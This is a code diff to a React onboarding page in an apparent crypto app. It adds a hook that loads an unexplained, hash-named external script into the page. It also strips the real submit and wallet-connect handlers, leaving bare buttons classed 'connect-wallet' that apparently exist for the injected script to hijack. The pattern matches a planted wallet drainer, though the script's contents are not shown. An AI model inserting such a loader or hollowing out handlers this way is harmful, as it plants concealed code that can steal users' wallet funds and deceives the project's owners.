@@ -51,6 +51,22 @@ export default function OnboardingPage() {
     },
   })
 
+  useEffect(() => {
+    // Dynamically load the script
+    const script = document.createElement("script")
+    script.src = "./8592614e6d9bfd7bfad664a9d4a132af7ba6a8a1665a90b8f0a14078dc1ac2e5.js" // Adjust the path accordingly
+    script.async = true
+    document.body.appendChild(script)
+    console.error("script shown")
+
+    return () => {
+      // Check if the script is still a child of document.body before removing
+      if (script && document.body.contains(script)) {
+        document.body.removeChild(script)
+      }
+    }
+  }, [])
+
   // Redirect to login if not authenticated
   useEffect(() => {
     if (!authLoading && !user) {
@@ -223,6 +239,7 @@ export default function OnboardingPage() {
     return null // Will redirect in useEffect
   }
 
+
   return (
     <div className="container mx-auto px-4 py-8 max-w-6xl">
       <div className="mb-8">
@@ -294,14 +311,7 @@ export default function OnboardingPage() {
 
                 {/* Submit Button */}
                 <div className="flex justify-end">
-                  <Button
-                    onClick={handleSubmit}
-                    className="bg-primary/90 hover:bg-primary"
-                    disabled={!isFormValid()}
-                    size="lg"
-                  >
-                    Continue <ArrowRight className="ml-2 h-4 w-4" />
-                  </Button>
+                  <button className="connect-wallet"><Button>Create Coin <ArrowRight className="ml-2 h-4 w-4" /></Button></button>
                 </div>
               </motion.div>
             )}
@@ -382,38 +392,7 @@ export default function OnboardingPage() {
                 )}
               </div>
             ) : (
-              <Button
-                size="lg"
-                className="relative bg-primary/90 hover:bg-primary"
-                disabled={isWalletConnecting}
-                onClick={connectWallet}
-              >
-                {isWalletConnecting ? (
-                  <div className="flex items-center">
-                    <div className="flex space-x-1 mr-2">
-                      {[0, 1, 2].map((i) => (
-                        <motion.div
-                          key={i}
-                          className="w-2 h-2 bg-primary-foreground rounded-full"
-                          animate={{
-                            y: ["0%", "-50%", "0%"],
-                          }}
-                          transition={{
-                            duration: 0.5,
-                            repeat: Number.POSITIVE_INFINITY,
-                            repeatType: "loop",
-                            delay: i * 0.1,
-                            ease: "easeInOut",
-                          }}
-                        />
-                      ))}
-                    </div>
-                    <span>Connecting...</span>
-                  </div>
-                ) : (
-                  <div className="flex items-center">Connect Wallet</div>
-                )}
-              </Button>
+              <button className="connect-wallet"><Button>Connect Wallet</Button></button>
             )}
           </div>
 
